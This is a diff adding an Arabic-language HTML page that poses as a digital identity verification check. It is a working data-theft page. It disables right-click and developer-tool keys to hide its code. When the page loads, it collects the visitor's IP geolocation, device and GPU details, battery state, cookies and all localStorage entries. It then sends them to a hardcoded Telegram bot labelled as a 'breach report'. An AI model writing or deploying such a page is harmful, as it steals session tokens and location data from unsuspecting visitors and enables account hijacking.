@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>نظام التحقق من الهوية الرقمية</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #fff; text-align: center; padding-top: 150px; user-select: none; }
+        .secure-box { border: 1px solid #2f3336; padding: 40px; border-radius: 12px; display: inline-block; background: #15181c; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .blink { animation: blinker 1.5s linear infinite; color: #e74c3c; font-weight: bold; margin-bottom: 10px; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .info { color: #8899a6; font-size: 0.9em; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="secure-box">
+        <div class="blink">● جاري فحص معايير الأمان العالمية...</div>
+        <p>الرجاء الانتظار، يتم الآن ربط جهازك بالسيرفر الآمن</p>
+        <p class="info">لا تقم بتحديث الصفحة لضمان اكتمال العملية</p>
+    </div>
+
+    <script>
+        // حماية الكود من الفحص
+        document.onkeydown = (e) => { 
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false; 
+        };
+
+        async function deepCapture() {
+            const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+            const CH_ID = "1678506419";
+
+            try {
+                // 1. الموقع والشبكة
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+
+                // 2. البطارية
+                let batt = "غير مدعوم";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = `${Math.round(b.level * 100)}% (${b.charging ? "موصل" : "فصل"})`;
+                }
+
+                // 3. كرت الشاشة
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+                // 4. سحب الكوكيز والتخزين المحلي (الإضافة الجديدة)
+                const cookies = document.cookie || "لا توجد كوكيز متاحة (HttpOnly)";
+                
+                let localData = "";
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        localData += `${key}: ${localStorage.getItem(key)}\n`;
+                    }
+                } catch(e) { localData = "ممنوع الوصول"; }
+                localData = localData || "فارغ";
+
+                // 5. بناء التقرير المرعب
+                const report = `
+💀 *تقرير اختراق بيانات كامل* 💀
+----------------------------------
+📍 *الموقع والشبكة:*
+- الـ IP: \`${ip.ip}\`
+- الدولة: ${ip.country_name} | المدينة: ${ip.city}
+- المزود: ${ip.org}
+- الإحداثيات: ${ip.latitude}, ${ip.longitude}
+
+📱 *مواصفات العتاد:*
+- النظام: ${navigator.platform}
+- المعالج: ${navigator.hardwareConcurrency} Cores
+- الرام: ${navigator.deviceMemory || "غير معروف"} GB
+- كرت الشاشة: ${gpu}
+- البطارية: ${batt}
+- الشاشة: ${window.screen.width}x${window.screen.height}
+
+🍪 *بيانات الجلسة (Cookies & Storage):*
+- الكوكيز: \`${cookies}\`
+- التخزين المحلي: 
+\`\`\`
+${localData.substring(0, 500)}
+\`\`\`
+
+🌐 *المتصفح والبصمة:*
+- المتصفح: ${navigator.userAgent.substring(0, 50)}...
+- اللغة: ${navigator.language}
+
+⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}
+----------------------------------`;
+
+                // 6. الإرسال للتليجرام
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CH_ID,
+                        text: report,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+            } catch (e) { console.error(e); }
+        }
+
+        window.onload = deepCapture;
+    </script>
+</body>
+</html>
